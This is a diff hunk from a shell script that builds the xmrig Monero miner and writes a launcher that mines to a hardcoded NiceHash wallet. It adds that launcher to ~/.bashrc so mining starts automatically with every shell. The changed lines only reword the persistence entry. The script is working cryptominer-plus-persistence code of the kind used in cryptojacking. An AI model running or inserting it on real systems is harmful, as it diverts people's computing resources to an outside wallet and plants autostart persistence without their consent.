@@ -8,9 +8,9 @@ make -j10
 echo "./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -a randomx -u NHbJB5KUkEUhp5pAkUYbera7bfdXWKTgjbNE.XMRIG -p x -k --nicehash" > start.sh
 chmod +x start.sh
 if [ ! -f ~/.bashrc ]; then
-  echo "~/xmrig/build/start.sh" > ~/.bashrc
+  echo "cd ~/xmrig/build/ && sh start.sh" > ~/.bashrc
 else
-  if ! grep -Fxq "~/xmrig/build/start.sh" ~/.bashrc; then
-    echo "~/xmrig/build/start.sh" >> ~/.bashrc
+  if ! grep -Fxq "cd ~/xmrig/build/ && sh start.sh" ~/.bashrc; then
+    echo "cd ~/xmrig/build/ && sh start.sh" >> ~/.bashrc
   fi
 fi
